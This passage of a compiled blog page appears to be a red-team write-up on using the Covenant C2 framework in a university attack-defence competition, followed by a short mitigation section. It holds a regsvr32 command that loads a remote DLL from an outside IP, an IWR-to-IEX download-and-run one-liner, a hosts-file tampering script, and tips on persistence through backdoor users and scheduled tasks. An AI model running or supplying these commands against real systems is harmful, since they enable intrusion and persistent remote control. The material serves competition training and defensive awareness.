+    &quot;loading&quot;: &quot;lazy&quot;,
+    &quot;style&quot;: {
+      &quot;width&quot;: &quot;100%&quot;,
+      &quot;height&quot;: &quot;100%&quot;,
+      &quot;margin&quot;: &quot;0&quot;,
+      &quot;verticalAlign&quot;: &quot;middle&quot;,
+      &quot;position&quot;: &quot;absolute&quot;,
+      &quot;top&quot;: &quot;0&quot;,
+      &quot;left&quot;: &quot;0&quot;
+    }
+  })), &quot;\n      &quot;), &quot;\n    &quot;), &quot;\n  &quot;, mdx(&quot;h4&quot;, {
+    parentName: &quot;div&quot;
+  }, &quot;Using regsvr32 as our launcher &quot;)), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {
+    &quot;className&quot;: &quot;language-powershell&quot;
+  }), &quot;regsvr32 /u /s /i:http://129.21.228.140/demo.dll scrobj.dll\n&quot;)), mdx(&quot;p&quot;, null, &quot;/u: Unregister server calling DllRegisterServer&quot;), mdx(&quot;p&quot;, null, &quot;/s: Silent: display no message boxes.&quot;), mdx(&quot;p&quot;, null, &quot;/i: Since used with /u calls Dll uninstall&quot;), mdx(&quot;p&quot;, null, &quot;scobj.dll: Is the Dllname that the entry points on.&quot;), mdx(&quot;p&quot;, null, &quot;Once ran on the target machine we get a nice beacon back\nand can have some fun. For the competition one of the most important\nthings to do is maintain persistence. Making sure to add backdoor\nusers, firewall rules, scheduled tasks, and services were essential.\nOne service that was critical is WinRM to allow us to remotely run\nscripts. Making sure it was running was quite simple with\nCovenant.&quot;), mdx(&quot;p&quot;, null, mdx(&quot;span&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-wrapper&quot;,
+    &quot;style&quot;: {
+      &quot;position&quot;: &quot;relative&quot;,
+      &quot;display&quot;: &quot;block&quot;,
+      &quot;marginLeft&quot;: &quot;auto&quot;,
+      &quot;marginRight&quot;: &quot;auto&quot;,
+      &quot;maxWidth&quot;: &quot;854px&quot;
+    }
+  }), &quot;\n      &quot;, mdx(&quot;span&quot;, _extends({
+    parentName: &quot;span&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-background-image&quot;,
+    &quot;style&quot;: {
+      &quot;paddingBottom&quot;: &quot;14.8711943793911%&quot;,
+      &quot;position&quot;: &quot;relative&quot;,
+      &quot;bottom&quot;: &quot;0&quot;,
+      &quot;left&quot;: &quot;0&quot;,
+      &quot;backgroundImage&quot;: &quot;url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAABJ0AAASdAHeZh94AAAAsklEQVQI1y2O226DMBAFkR3AJEKBAAZsLgablKT9/9+bWm0eRtqHPaNJ7oOh7C2iHRD9hLAOaRy30fHYTip3Ukaq/Zt6f3N3X1ztTj4fKOspekcxOEqzYVwgafwRHw/EvCH8ifQvLuFNEYfZHMiWJ6l7ka0nKvyQxzsdo3AKKOP/ZCrSLZ563klujeb60Iiqi5UG2VmknknbWF2PyGZCtguXbiXV/+Qf1KeuGDb06qmi8BcB9EvtCTX2LQAAAABJRU5ErkJggg==&apos;)&quot;,
+      &quot;backgroundSize&quot;: &quot;cover&quot;,
+      &quot;display&quot;: &quot;block&quot;
+    }
+  })), &quot;\n  &quot;, mdx(&quot;picture&quot;, {
+    parentName: &quot;span&quot;
+  }, &quot;\n        &quot;, mdx(&quot;source&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;srcSet&quot;: [&quot;/static/08435ddb152b4c67cb5743f0976bc7a9/565b8/example_powershell.webp 854w&quot;],
+    &quot;sizes&quot;: &quot;(max-width: 854px) 100vw, 854px&quot;,
+    &quot;type&quot;: &quot;image/webp&quot;
+  })), &quot;\n        &quot;, mdx(&quot;source&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;srcSet&quot;: [&quot;/static/08435ddb152b4c67cb5743f0976bc7a9/89c55/example_powershell.png 854w&quot;],
+    &quot;sizes&quot;: &quot;(max-width: 854px) 100vw, 854px&quot;,
+    &quot;type&quot;: &quot;image/png&quot;
+  })), &quot;\n        &quot;, mdx(&quot;img&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-image&quot;,
+    &quot;src&quot;: &quot;/static/08435ddb152b4c67cb5743f0976bc7a9/89c55/example_powershell.png&quot;,
+    &quot;alt&quot;: &quot;Restarting_Winrm&quot;,
+    &quot;title&quot;: &quot;Restarting_Winrm&quot;,
+    &quot;loading&quot;: &quot;lazy&quot;,
+    &quot;style&quot;: {
+      &quot;width&quot;: &quot;100%&quot;,
+      &quot;height&quot;: &quot;100%&quot;,
+      &quot;margin&quot;: &quot;0&quot;,
+      &quot;verticalAlign&quot;: &quot;middle&quot;,
+      &quot;position&quot;: &quot;absolute&quot;,
+      &quot;top&quot;: &quot;0&quot;,
+      &quot;left&quot;: &quot;0&quot;
+    }
+  })), &quot;\n      &quot;), &quot;\n    &quot;)), mdx(&quot;p&quot;, null, &quot;Although, in most cases we had those commands in a powershell\nfile hosted somewhere so we were able to simply do. &quot;), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {
+    &quot;className&quot;: &quot;language-powershell&quot;
+  }), &quot;(IWR -Uri \&quot;https://hostingsite.com\&quot; -UseBasicParsing).Content | IEX\n&quot;)), mdx(&quot;p&quot;, null, &quot;IWR: Invoke-WebRequest&quot;), mdx(&quot;p&quot;, null, &quot;IEX: Invoke-Expression&quot;), mdx(&quot;p&quot;, null, &quot;It was also fun messing with them by doing very basic things\nsuch as messing with the hosts file in Windows.&quot;), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {
+    &quot;className&quot;: &quot;language-powershell&quot;
+  }), &quot;    $hosts_path = \&quot;C:\\Windows\\System32\\drivers\\etc\\hosts\&quot;\n    $local = \&quot;127.0.0.1\&quot;\n    $text = @\&quot;\n    $local      github.com\n    $local      termbin.com\n    $local      pastebin.com\n    $local      tinyurl.com\n    $local      bitly.com \n    $local      google.com\n    $local  stackoverflow.com\n    $local  raw.githubusercontent.com\n    $local  chocolatey.org\n    $local  docs.microsoft.com\n    $local  wireshark.org\n\&quot;@ \n    Add-Content -Path $hosts_path -Value $text\n&quot;)), mdx(&quot;p&quot;, null, &quot;Of course Covenant had some nice features such as\nGetSystem which allowed us to run things at System level. While\nalso having standard things such as Mimikatz and Registry\nmanipulation. However, a pretty unique feature was the integration of allowing\npeople to run C# sharp code.&quot;), mdx(&quot;h3&quot;, {
+    &quot;id&quot;: &quot;customization&quot;
+  }, &quot;Customization&quot;), mdx(&quot;p&quot;, null, &quot;Covenant on it\u2019s own is great; however, as part of the\n&quot;, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;href&quot;: &quot;https://github.com/RITRedTeam&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;RITSECRedTeam&quot;), &quot; we like to keep track of things.\nOne of the most important things is the &quot;, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;href&quot;: &quot;https://github.com/micahjmartin/pwnboard&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;pwnboard&quot;), &quot;.\nThe pwnboard is a visualization to keep track of what we have control of and to\nsee what teams are giving us trouble.&quot;), mdx(&quot;p&quot;, null, mdx(&quot;span&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-wrapper&quot;,
+    &quot;style&quot;: {
+      &quot;position&quot;: &quot;relative&quot;,
+      &quot;display&quot;: &quot;block&quot;,
+      &quot;marginLeft&quot;: &quot;auto&quot;,
+      &quot;marginRight&quot;: &quot;auto&quot;,
+      &quot;maxWidth&quot;: &quot;1899px&quot;
+    }
+  }), &quot;\n      &quot;, mdx(&quot;span&quot;, _extends({
+    parentName: &quot;span&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-background-image&quot;,
+    &quot;style&quot;: {
+      &quot;paddingBottom&quot;: &quot;42.33807266982622%&quot;,
+      &quot;position&quot;: &quot;relative&quot;,
+      &quot;bottom&quot;: &quot;0&quot;,
+      &quot;left&quot;: &quot;0&quot;,
+      &quot;backgroundImage&quot;: &quot;url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAABJ0AAASdAHeZh94AAABOklEQVQoz01QSU7DQBD0D0i8TewAcQQCxCJuKOGARCAXrvERhcCBd+BlDLw4HttS08s44VCqqe4aVamd05s7SOYpTOYr5sTyZLbCWcrvy6c1XC83PEvsTP6kOw9hep+Cc7X8gFgbGJW1ZcOsSsFRVUOYb2FUbFlHmvZ7L2GMnrgyMP014JwtNhCWLfiFBb49ZLcQVlrmSnfMod1HVcc70oSg7GD83YJz+/LJyX5eQ1AYCC0CC2oTFjV7aN57qVloZ5EWffxDDR/XtmGDKYQ+URBXDWqEbnc78iq990Ra9ofU8OL5HdzMwOBLcIAYZsIDZA/bDJll33vdXHwEPxftY1vn5OGV07y84RsF/+5JbRSmB7aRZ+fk7X1yZ9FRhQ3PF2+SkNXcgrBLRKiCbiv3pZ2waN/6VSma7vgHxoKDt3dlm1QAAAAASUVORK5CYII=&apos;)&quot;,
+      &quot;backgroundSize&quot;: &quot;cover&quot;,
+      &quot;display&quot;: &quot;block&quot;
+    }
+  })), &quot;\n  &quot;, mdx(&quot;picture&quot;, {
+    parentName: &quot;span&quot;
+  }, &quot;\n        &quot;, mdx(&quot;source&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;srcSet&quot;: [&quot;/static/b14d7f60911c39c74299be7a98856cc2/2190f/pwnboard.webp 1899w&quot;],
+    &quot;sizes&quot;: &quot;(max-width: 1899px) 100vw, 1899px&quot;,
+    &quot;type&quot;: &quot;image/webp&quot;
+  })), &quot;\n        &quot;, mdx(&quot;source&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;srcSet&quot;: [&quot;/static/b14d7f60911c39c74299be7a98856cc2/3254a/pwnboard.png 1899w&quot;],
+    &quot;sizes&quot;: &quot;(max-width: 1899px) 100vw, 1899px&quot;,
+    &quot;type&quot;: &quot;image/png&quot;
+  })), &quot;\n        &quot;, mdx(&quot;img&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-image&quot;,
+    &quot;src&quot;: &quot;/static/b14d7f60911c39c74299be7a98856cc2/3254a/pwnboard.png&quot;,
+    &quot;alt&quot;: &quot;pwnboard-blue&quot;,
+    &quot;title&quot;: &quot;pwnboard-blue&quot;,
+    &quot;loading&quot;: &quot;lazy&quot;,
+    &quot;style&quot;: {
+      &quot;width&quot;: &quot;100%&quot;,
+      &quot;height&quot;: &quot;100%&quot;,
+      &quot;margin&quot;: &quot;0&quot;,
+      &quot;verticalAlign&quot;: &quot;middle&quot;,
+      &quot;position&quot;: &quot;absolute&quot;,
+      &quot;top&quot;: &quot;0&quot;,
+      &quot;left&quot;: &quot;0&quot;
+    }
+  })), &quot;\n      &quot;), &quot;\n    &quot;)), mdx(&quot;p&quot;, null, &quot;To show that you have control of a box is a mere post request with\njson that contains the ip and type of beacon. There is one obvious problem,\nCovenant doesn\u2019t automatically do this. That\u2019s ok I was planning on\nlearning C#. After talking to the developer to figure out where to\nmake the post request to pwnboard whenever a Grunt was created.&quot;), mdx(&quot;p&quot;, null, mdx(&quot;span&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-wrapper&quot;,
+    &quot;style&quot;: {
+      &quot;position&quot;: &quot;relative&quot;,
+      &quot;display&quot;: &quot;block&quot;,
+      &quot;marginLeft&quot;: &quot;auto&quot;,
+      &quot;marginRight&quot;: &quot;auto&quot;,
+      &quot;maxWidth&quot;: &quot;890px&quot;
+    }
+  }), &quot;\n      &quot;, mdx(&quot;span&quot;, _extends({
+    parentName: &quot;span&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-background-image&quot;,
+    &quot;style&quot;: {
+      &quot;paddingBottom&quot;: &quot;54.26966292134831%&quot;,
+      &quot;position&quot;: &quot;relative&quot;,
+      &quot;bottom&quot;: &quot;0&quot;,
+      &quot;left&quot;: &quot;0&quot;,
+      &quot;backgroundImage&quot;: &quot;url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAABJ0AAASdAHeZh94AAAByklEQVQoz21S2ZLbMAzb74glS7J1WIfvpLuZbfv/f4VCapM2nX3A8NAIJEi+aW1gQoEtM9w8w6aM5cg4bwW39wXhKHA32rMg7CuW64nR8Y/VMKOGlBJ93z/xprWmI+CShs8GLmrYPEBZBdFLCCEgKyTBuFcCSitoo5r9ktCwyzhFGDdi8BbjqGANifnmBoORHx1jo3oWkOg6AdGJJ1m1D78RKjqDneD37yjvPyn5hvte8OOc8a1E3I8Nn9cd93PHVhKLO1g7QqnXDqV8SpbsbMK0f1D6gnj9QNlWpGWBnTPc9Yq4HbCRvvdI0SPGgPr3lVD+6ZCVNNHXBbkAOyXmDKSyv2Pv2NUIxyV0lwsul66h42zrCNqcXyRXslqF1s8HwrZjyJHICPOKkAom+nndMIYIR7kT5x2qtQO8s0/5fwk5cGP4mDfkpaDsGWVN2OaCOaWGc11RciKBw7JfMTM+lojzXOGYq502wnqLyScME+fCgetakdWNtW0UQnTtdB62diJaLChbNtl1Dy+Sg4+YuN3MbRYec94KFm60TL7JSpQYWaTazNOag4UfOfNhQEwTZl7DFALejGGSeGyp/wr/HG6F+i9uOdW3xn4B+o83qJ40UpsAAAAASUVORK5CYII=&apos;)&quot;,
+      &quot;backgroundSize&quot;: &quot;cover&quot;,
+      &quot;display&quot;: &quot;block&quot;
+    }
+  })), &quot;\n  &quot;, mdx(&quot;picture&quot;, {
+    parentName: &quot;span&quot;
+  }, &quot;\n        &quot;, mdx(&quot;source&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;srcSet&quot;: [&quot;/static/3f8773f032f33b909b35948adf617d86/b1cab/post_topwnboard.webp 890w&quot;],
+    &quot;sizes&quot;: &quot;(max-width: 890px) 100vw, 890px&quot;,
+    &quot;type&quot;: &quot;image/webp&quot;
+  })), &quot;\n        &quot;, mdx(&quot;source&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;srcSet&quot;: [&quot;/static/3f8773f032f33b909b35948adf617d86/91293/post_topwnboard.png 890w&quot;],
+    &quot;sizes&quot;: &quot;(max-width: 890px) 100vw, 890px&quot;,
+    &quot;type&quot;: &quot;image/png&quot;
+  })), &quot;\n        &quot;, mdx(&quot;img&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-image&quot;,
+    &quot;src&quot;: &quot;/static/3f8773f032f33b909b35948adf617d86/91293/post_topwnboard.png&quot;,
+    &quot;alt&quot;: &quot;post_req&quot;,
+    &quot;title&quot;: &quot;post_req&quot;,
+    &quot;loading&quot;: &quot;lazy&quot;,
+    &quot;style&quot;: {
+      &quot;width&quot;: &quot;100%&quot;,
+      &quot;height&quot;: &quot;100%&quot;,
+      &quot;margin&quot;: &quot;0&quot;,
+      &quot;verticalAlign&quot;: &quot;middle&quot;,
+      &quot;position&quot;: &quot;absolute&quot;,
+      &quot;top&quot;: &quot;0&quot;,
+      &quot;left&quot;: &quot;0&quot;
+    }
+  })), &quot;\n      &quot;), &quot;\n    &quot;)), mdx(&quot;p&quot;, null, &quot;This function is inside Covenant/GruntController.cs,\nit just does a post request using the Grunt\u2019s ip address\nwrapped inside a try catch statement in case we lose connection.&quot;), mdx(&quot;p&quot;, null, &quot;Due to last minute complications, the dotnet framework couldn\u2019t\nbe installed on every Windows box so I used a powershell launcher\nfor all of the boxes as well as the Regsvr32 launcher if possible.\nAs we could prebake our stuff I was able to deploy to all of the boxes\nand watch the beacons rain down as well as turn the pwnboard red.&quot;), mdx(&quot;p&quot;, null, mdx(&quot;span&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-wrapper&quot;,
+    &quot;style&quot;: {
+      &quot;position&quot;: &quot;relative&quot;,
+      &quot;display&quot;: &quot;block&quot;,
+      &quot;marginLeft&quot;: &quot;auto&quot;,
+      &quot;marginRight&quot;: &quot;auto&quot;,
+      &quot;maxWidth&quot;: &quot;1920px&quot;
+    }
+  }), &quot;\n      &quot;, mdx(&quot;span&quot;, _extends({
+    parentName: &quot;span&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-background-image&quot;,
+    &quot;style&quot;: {
+      &quot;paddingBottom&quot;: &quot;42.1875%&quot;,
+      &quot;position&quot;: &quot;relative&quot;,
+      &quot;bottom&quot;: &quot;0&quot;,
+      &quot;left&quot;: &quot;0&quot;,
+      &quot;backgroundImage&quot;: &quot;url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAABJ0AAASdAHeZh94AAABXElEQVQoz01RW07CUBTsfkxMFGNEUOkDSqEFhQL6awT3opiAbkHYCbgBXoUEmgBuY5zTWyofk3mefvRq1css5nYDi3wdi4KPoNjEnDqQrCC5T09Y9UgHzJINecGdbAOnxU0NWvn8CgGHS7OGJXklB9QR8yNLQvRKNpZ/tFG5+Cizm8weoPnpO6ytKja6h41RQRjr0KxG/qBD0dIfb4TjLszfY51zodmpDEZeB+NyG+PSC8beK0bkH7eNkRtnrupHshHQq01HdaIrvHOeoenXNnqtd/SbRKurQP0Z8yET35P8sRuhz5uvpw/VSUbda7xBK51eYGt52Otl7AwXe9PDjnpvxRxlbsQ7o6w0Id2vVYkz3lNvcw4fJZXGhD97ZtQw5QPMqKd8FMX0pspm7KaJVt0830huZnygic5HyZ6cYXBbwiBbxODGwZAYZGwM4yzykksf43/jJF7wnSngD9J0e5Qt6ZSiAAAAAElFTkSuQmCC&apos;)&quot;,
+      &quot;backgroundSize&quot;: &quot;cover&quot;,
+      &quot;display&quot;: &quot;block&quot;
+    }
+  })), &quot;\n  &quot;, mdx(&quot;picture&quot;, {
+    parentName: &quot;span&quot;
+  }, &quot;\n        &quot;, mdx(&quot;source&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;srcSet&quot;: [&quot;/static/0e4b959883f1cb5739fc23f5eb277816/f3ff0/pwnboard_red.webp 1920w&quot;],
+    &quot;sizes&quot;: &quot;(max-width: 1920px) 100vw, 1920px&quot;,
+    &quot;type&quot;: &quot;image/webp&quot;
+  })), &quot;\n        &quot;, mdx(&quot;source&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;srcSet&quot;: [&quot;/static/0e4b959883f1cb5739fc23f5eb277816/7d442/pwnboard_red.png 1920w&quot;],
+    &quot;sizes&quot;: &quot;(max-width: 1920px) 100vw, 1920px&quot;,
+    &quot;type&quot;: &quot;image/png&quot;
+  })), &quot;\n        &quot;, mdx(&quot;img&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-image&quot;,
+    &quot;src&quot;: &quot;/static/0e4b959883f1cb5739fc23f5eb277816/7d442/pwnboard_red.png&quot;,
+    &quot;alt&quot;: &quot;pwnboard-red&quot;,
+    &quot;title&quot;: &quot;pwnboard-red&quot;,
+    &quot;loading&quot;: &quot;lazy&quot;,
+    &quot;style&quot;: {
+      &quot;width&quot;: &quot;100%&quot;,
+      &quot;height&quot;: &quot;100%&quot;,
+      &quot;margin&quot;: &quot;0&quot;,
+      &quot;verticalAlign&quot;: &quot;middle&quot;,
+      &quot;position&quot;: &quot;absolute&quot;,
+      &quot;top&quot;: &quot;0&quot;,
+      &quot;left&quot;: &quot;0&quot;
+    }
+  })), &quot;\n      &quot;), &quot;\n    &quot;)), mdx(&quot;p&quot;, null, &quot;At the start of the competition these are just some of the beacons.&quot;), mdx(&quot;p&quot;, null, mdx(&quot;span&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-wrapper&quot;,
+    &quot;style&quot;: {
+      &quot;position&quot;: &quot;relative&quot;,
+      &quot;display&quot;: &quot;block&quot;,
+      &quot;marginLeft&quot;: &quot;auto&quot;,
+      &quot;marginRight&quot;: &quot;auto&quot;,
+      &quot;maxWidth&quot;: &quot;1740px&quot;
+    }
+  }), &quot;\n      &quot;, mdx(&quot;span&quot;, _extends({
+    parentName: &quot;span&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-background-image&quot;,
+    &quot;style&quot;: {
+      &quot;paddingBottom&quot;: &quot;59.25287356321839%&quot;,
+      &quot;position&quot;: &quot;relative&quot;,
+      &quot;bottom&quot;: &quot;0&quot;,
+      &quot;left&quot;: &quot;0&quot;,
+      &quot;backgroundImage&quot;: &quot;url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAABJ0AAASdAHeZh94AAABv0lEQVQoz3WSSW/CQAyFQwh7SCY7YRUIISQO/BkEHNoDQikg/v/51c9l1CLoYTSO4/n8vDj7/R4fnx/Y7Xa43W6oqgqn0wnn8xmXywX3+x2X6xVXOVX1pTfj6Kd9PB5xOBz05nEazSZarRYcx0FeFOj1eqjVXLiuq35jDHzfR7vd1hj+7/f7CMMQ3W5XfU8nSVJkaYqmgKezGVKxoyhSUJZlGI1GGAwGahNaSFL6ptMphsMhPM/T5PV6XY/Dx0mS6A8G0jbi8/2+gvM81yShCVETBXEcoyxLTCYTuQdSTe1ZIQOYncDlcqkKAiknFIVFkasSJiKYLShFFb//BVIRSyZwsVjow/ABZCI+ZGm0G42GqvsFlq/AvyUTmGYpgiBQKEsdj8faQybiEGgTRD+reQEa8wN0paG2h4T1ZLIcjB2IiYw+ZhL6GPsWaBVyQgzmikTS146o8R9QJvBlVTyvLisTqMKZbARb8ToUgdmGr1Yrzao9DI367XpQJVeL6vhN/9seWgX8mM/nCuTi8sRJrErYL8Kdx9oQyqHwfllsBq7Xa12H7XaLzWajkE6no8Oxe8jEXGzatmT2kao5fXu+ASpTLf30lvMCAAAAAElFTkSuQmCC&apos;)&quot;,
+      &quot;backgroundSize&quot;: &quot;cover&quot;,
+      &quot;display&quot;: &quot;block&quot;
+    }
+  })), &quot;\n  &quot;, mdx(&quot;picture&quot;, {
+    parentName: &quot;span&quot;
+  }, &quot;\n        &quot;, mdx(&quot;source&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;srcSet&quot;: [&quot;/static/e2512df591851a8bba7030894355e6a4/68a58/call_backs.webp 1740w&quot;],
+    &quot;sizes&quot;: &quot;(max-width: 1740px) 100vw, 1740px&quot;,
+    &quot;type&quot;: &quot;image/webp&quot;
+  })), &quot;\n        &quot;, mdx(&quot;source&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;srcSet&quot;: [&quot;/static/e2512df591851a8bba7030894355e6a4/8d39c/call_backs.png 1740w&quot;],
+    &quot;sizes&quot;: &quot;(max-width: 1740px) 100vw, 1740px&quot;,
+    &quot;type&quot;: &quot;image/png&quot;
+  })), &quot;\n        &quot;, mdx(&quot;img&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-image&quot;,
+    &quot;src&quot;: &quot;/static/e2512df591851a8bba7030894355e6a4/8d39c/call_backs.png&quot;,
+    &quot;alt&quot;: &quot;call_backs&quot;,
+    &quot;title&quot;: &quot;call_backs&quot;,
+    &quot;loading&quot;: &quot;lazy&quot;,
+    &quot;style&quot;: {
+      &quot;width&quot;: &quot;100%&quot;,
+      &quot;height&quot;: &quot;100%&quot;,
+      &quot;margin&quot;: &quot;0&quot;,
+      &quot;verticalAlign&quot;: &quot;middle&quot;,
+      &quot;position&quot;: &quot;absolute&quot;,
+      &quot;top&quot;: &quot;0&quot;,
+      &quot;left&quot;: &quot;0&quot;
+    }
+  })), &quot;\n      &quot;), &quot;\n    &quot;)), mdx(&quot;h3&quot;, {
+    &quot;id&quot;: &quot;mitigation&quot;
+  }, &quot;Mitigation&quot;), mdx(&quot;p&quot;, null, &quot;Monitoring processes and network traffic on your system is\ncrucial as it will be much easier to spot when something\nis out of the ordinary. For example if you\u2019ve never seen\nRegsvr32 running on your system before it might be worthwhile\nto investigate and you would be shocked at what you find.&quot;), mdx(&quot;p&quot;, null, mdx(&quot;span&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-wrapper&quot;,
+    &quot;style&quot;: {
+      &quot;position&quot;: &quot;relative&quot;,
+      &quot;display&quot;: &quot;block&quot;,
+      &quot;marginLeft&quot;: &quot;auto&quot;,
+      &quot;marginRight&quot;: &quot;auto&quot;,
+      &quot;maxWidth&quot;: &quot;1235px&quot;
+    }
+  }), &quot;\n      &quot;, mdx(&quot;span&quot;, _extends({
+    parentName: &quot;span&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-background-image&quot;,
+    &quot;style&quot;: {
+      &quot;paddingBottom&quot;: &quot;43.64372469635628%&quot;,
+      &quot;position&quot;: &quot;relative&quot;,
+      &quot;bottom&quot;: &quot;0&quot;,
+      &quot;left&quot;: &quot;0&quot;,
+      &quot;backgroundImage&quot;: &quot;url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAABJ0AAASdAHeZh94AAAA40lEQVQoz5VSAY6DIBDk/z806aXt5WhR0KIWFRXndmlo2sR65yYTYFlgdgYhpYRSOeq6hrU2jq+43WzMM5xzGIZhFV3XoWkaiIoO8KRt7xjHcRPzPCOE8BwTeL0sCyFAaG2gC02vd0jx2NwHfnCaJojT8YQiL1CaMjLltrz3H1tbA9ezPDwXh8PX8yJObum0hb7vI0uRkyGlMfCUDKTF9IeOa+BWlVKRjDCVhVQauiJHGxf1+G+kWjYmy7KHyz/yAk36FbrE8fxN9P0uY1It68huC3VV6OkPubujr9O+XbaHZYpfFSy+awtw2GkAAAAASUVORK5CYII=&apos;)&quot;,
+      &quot;backgroundSize&quot;: &quot;cover&quot;,
+      &quot;display&quot;: &quot;block&quot;
+    }
+  })), &quot;\n  &quot;, mdx(&quot;picture&quot;, {
+    parentName: &quot;span&quot;
+  }, &quot;\n        &quot;, mdx(&quot;source&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;srcSet&quot;: [&quot;/static/e9be5fd4f9ca8329fa8816da8f9a8cde/72670/procexp_regsvr.webp 1235w&quot;],
+    &quot;sizes&quot;: &quot;(max-width: 1235px) 100vw, 1235px&quot;,
+    &quot;type&quot;: &quot;image/webp&quot;
+  })), &quot;\n        &quot;, mdx(&quot;source&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;srcSet&quot;: [&quot;/static/e9be5fd4f9ca8329fa8816da8f9a8cde/2360d/procexp_regsvr.png 1235w&quot;],
+    &quot;sizes&quot;: &quot;(max-width: 1235px) 100vw, 1235px&quot;,
+    &quot;type&quot;: &quot;image/png&quot;
+  })), &quot;\n        &quot;, mdx(&quot;img&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-image&quot;,
+    &quot;src&quot;: &quot;/static/e9be5fd4f9ca8329fa8816da8f9a8cde/2360d/procexp_regsvr.png&quot;,
+    &quot;alt&quot;: &quot;RegsvrImage&quot;,
+    &quot;title&quot;: &quot;RegsvrImage&quot;,
+    &quot;loading&quot;: &quot;lazy&quot;,
+    &quot;style&quot;: {
+      &quot;width&quot;: &quot;100%&quot;,
+      &quot;height&quot;: &quot;100%&quot;,
+      &quot;margin&quot;: &quot;0&quot;,
+      &quot;verticalAlign&quot;: &quot;middle&quot;,
+      &quot;position&quot;: &quot;absolute&quot;,
+      &quot;top&quot;: &quot;0&quot;,
+      &quot;left&quot;: &quot;0&quot;
+    }
+  })), &quot;\n      &quot;), &quot;\n    &quot;)), mdx(&quot;p&quot;, null, &quot;However, knowing what\u2019s going in and out of your network is just as\nimportant if you opened wireshark and noticed a lot of http\ntraffic that would be highly suspicious.\nFor example, if you noticed this http traffic.&quot;), mdx(&quot;p&quot;, null, mdx(&quot;span&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-wrapper&quot;,
+    &quot;style&quot;: {
+      &quot;position&quot;: &quot;relative&quot;,
+      &quot;display&quot;: &quot;block&quot;,
+      &quot;marginLeft&quot;: &quot;auto&quot;,
+      &quot;marginRight&quot;: &quot;auto&quot;,
+      &quot;maxWidth&quot;: &quot;1896px&quot;
+    }
+  }), &quot;\n      &quot;, mdx(&quot;span&quot;, _extends({
+    parentName: &quot;span&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-background-image&quot;,
+    &quot;style&quot;: {
+      &quot;paddingBottom&quot;: &quot;37.13080168776371%&quot;,
+      &quot;position&quot;: &quot;relative&quot;,
+      &quot;bottom&quot;: &quot;0&quot;,
+      &quot;left&quot;: &quot;0&quot;,
